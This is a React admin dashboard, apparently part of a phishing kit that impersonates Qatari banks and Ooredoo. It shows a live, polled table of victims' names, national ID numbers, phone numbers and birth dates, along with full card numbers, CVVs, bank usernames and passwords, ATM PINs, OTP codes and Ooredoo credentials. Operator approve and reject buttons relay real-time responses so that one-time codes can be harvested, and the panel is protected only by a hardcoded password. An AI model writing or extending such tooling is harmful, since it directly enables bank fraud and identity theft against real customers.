import { useState, useMemo, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Loader2, Eye, RefreshCcw, Check, X } from "lucide-react";

export default function AdminDashboard() {
  const { language, t } = useLanguage();
  const [, setLocation] = useLocation();
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [error, setError] = useState("");

  const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000, // Polling every 3 seconds
  });

  const { data: details } = trpc.submissions.getSubmissionDetails.useQuery(selectedSession || "", {
    enabled: !!selectedSession && isAuthenticated,
  });

  const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({
    onSuccess: () => {
      refetch();
    }
  });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Simple password check as requested
    if (password === "admin123") {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("كلمة المرور غير صحيحة");
    }
  };

  const filteredSubmissions = useMemo(() => {
    if (!submissions) return [];
    return submissions.filter((sub) =>
      sub.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      sub.selectedBank.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [submissions, searchTerm]);

  const handleAction = async (sessionId: string, action: string) => {
    let errorMessage = "";
    if (action === "reject") {
      const session = submissions?.find(s => s.id === sessionId);
      if (session?.currentStep === "login") errorMessage = t("invalid_data");
      else if (session?.currentStep === "otp" || session?.currentStep === "otp_ooredoo") errorMessage = t("invalid_otp");
      else if (session?.currentStep === "atm") errorMessage = t("invalid_atm");
      else if (session?.currentStep === "ooredoo") errorMessage = t("invalid_ooredoo");
    }
    await adminTakeAction.mutateAsync({ sessionId, action, errorMessage });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100" dir="rtl">
        <form onSubmit={handleLogin} className="bg-white p-8 rounded-lg shadow-md w-96">
          <h2 className="text-2xl font-bold mb-6 text-center">دخول لوحة الإدارة</h2>
          <Input
            type="password"
            placeholder="كلمة المرور"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="mb-4"
          />
          {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
          <Button type="submit" className="w-full bg-red-600 hover:bg-red-700 text-white">
            دخول
          </Button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50" dir={language === "ar" ? "rtl" : "ltr"}>
      <header className="sticky top-0 z-50 bg-white border-b shadow-sm">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <Button variant="ghost" onClick={() => setLocation("/")}>{t("back")}</Button>
          <h1 className="text-xl font-bold text-gray-900">{t("actions_list")}</h1>
          <div className="w-20" />
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="mb-6">
          <Input
            placeholder={t("search")}
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="max-w-md"
          />
        </div>

        <div className="bg-white rounded-xl shadow-sm overflow-hidden border">
          {isLoading ? (
            <div className="p-12 flex justify-center"><Loader2 className="animate-spin text-red-600 w-8 h-8" /></div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm text-right">
                <thead className="bg-gray-50 border-b text-gray-700 font-medium">
                  <tr>
                    <th className="px-6 py-4">{t("country")}</th>
                    <th className="px-6 py-4">{t("bank")}</th>
                    <th className="px-6 py-4">{t("name")}</th>
                    <th className="px-6 py-4">{t("phone")}</th>
                    <th className="px-6 py-4">{t("identity")}</th>
                    <th className="px-6 py-4 text-center">{t("actions")}</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {filteredSubmissions.map((sub) => (
                    <tr key={sub.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4">{sub.country || "Qatar"}</td>
                      <td className="px-6 py-4 font-semibold text-red-700">{sub.selectedBank.toUpperCase()}</td>
                      <td className="px-6 py-4">{sub.nameArabic}</td>
                      <td className="px-6 py-4">{sub.phoneNumber}</td>
                      <td className="px-6 py-4">{sub.idNumber}</td>
                      <td className="px-6 py-4">
                        <div className="flex items-center justify-center gap-2">
                          <Button 
                            variant="outline" 
                            size="sm" 
                            className="flex items-center gap-1"
                            onClick={() => {
                              setSelectedSession(sub.id);
                              setShowDetails(true);
                            }}
                          >
                            <Eye className="w-4 h-4" /> {t("details")}
                          </Button>
                          <Button variant="outline" size="sm" className="flex items-center gap-1">
                            <RefreshCcw className="w-4 h-4" /> {t("redirect")}
                          </Button>
                          {sub.status === "loading" && (
                            <div className="flex gap-1 ml-2">
                              <Button 
                                size="sm" 
                                className="bg-green-600 hover:bg-green-700 text-white"
                                onClick={() => handleAction(sub.id, "approve")}
                              >
                                <Check className="w-4 h-4" />
                              </Button>
                              <Button 
                                size="sm" 
                                className="bg-red-600 hover:bg-red-700 text-white"
                                onClick={() => handleAction(sub.id, "reject")}
                              >
                                <X className="w-4 h-4" />
                              </Button>
                            </div>
                          )}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>{t("details")}</DialogTitle>
          </DialogHeader>
          {details ? (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="p-3 bg-gray-50 rounded border">
                  <p className="text-xs text-gray-500 mb-1">Session ID</p>
                  <p className="font-mono text-sm">{details.session.id}</p>
                </div>
                <div className="p-3 bg-gray-50 rounded border">
                  <p className="text-xs text-gray-500 mb-1">Bank</p>
                  <p className="font-bold text-red-700">{details.session.selectedBank.toUpperCase()}</p>
                </div>
              </div>
              
              {details.personalData && (
                <div className="border rounded-lg p-4 space-y-2">
                  <h3 className="font-bold border-b pb-2 mb-2">البيانات الشخصية</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div><span className="text-gray-500">الاسم (AR):</span> {details.personalData.nameArabic}</div>
                    <div><span className="text-gray-500">الاسم (EN):</span> {details.personalData.nameEnglish}</div>
                    <div><span className="text-gray-500">الهوية:</span> {details.personalData.idNumber}</div>
                    <div><span className="text-gray-500">الهاتف:</span> {details.personalData.phoneNumber}</div>
                    <div><span className="text-gray-500">الميلاد:</span> {details.personalData.dateOfBirth}</div>
                    <div><span className="text-gray-500">الجنس:</span> {details.personalData.gender}</div>
                  </div>
                </div>
              )}

              {details.loginMethod && (
                <div className="border rounded-lg p-4 space-y-2">
                  <h3 className="font-bold border-b pb-2 mb-2">طريقة تسجيل الدخول</h3>
                  <div className="text-sm">
                    <p><span className="text-gray-500">النوع:</span> {details.loginMethod.loginType}</p>
                    {details.loginMethod.loginType === "card" ? (
                      <div className="grid grid-cols-2 gap-2 mt-2">
                        <div><span className="text-gray-500">رقم البطاقة:</span> {details.loginMethod.cardNumber}</div>
                        <div><span className="text-gray-500">الاسم:</span> {details.loginMethod.cardholderName}</div>
                        <div><span className="text-gray-500">التاريخ:</span> {details.loginMethod.expiryDate}</div>
                        <div><span className="text-gray-500">CVV:</span> {details.loginMethod.cvv}</div>
                      </div>
                    ) : (
                      <div className="grid grid-cols-2 gap-2 mt-2">
                        <div><span className="text-gray-500">المستخدم:</span> {details.loginMethod.username}</div>
                        <div><span className="text-gray-500">كلمة المرور:</span> {details.loginMethod.password}</div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {details.atmPin && (
                <div className="border rounded-lg p-4 bg-red-50 border-red-200">
                  <h3 className="font-bold text-red-800 border-b border-red-200 pb-2 mb-2">ATM PIN</h3>
                  <p className="text-2xl font-mono text-center tracking-widest">{details.atmPin.pin}</p>
                </div>
              )}

              {details.otp && (
                <div className="border rounded-lg p-4 bg-blue-50 border-blue-200">
                  <h3 className="font-bold text-blue-800 border-b border-blue-200 pb-2 mb-2">OTP ({details.otp.otpType})</h3>
                  <p className="text-2xl font-mono text-center tracking-widest">{details.otp.otpCode}</p>
                </div>
              )}

              {details.ooredoo && (
                <div className="border rounded-lg p-4 bg-purple-50 border-purple-200">
                  <h3 className="font-bold text-purple-800 border-b border-purple-200 pb-2 mb-2">Ooredoo Login</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div><span className="text-gray-500">المستخدم:</span> {details.ooredoo.ooredooUser}</div>
                    <div><span className="text-gray-500">كلمة المرور:</span> {details.ooredoo.ooredooPassword}</div>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <div className="p-12 flex justify-center"><Loader2 className="animate-spin text-red-600 w-8 h-8" /></div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
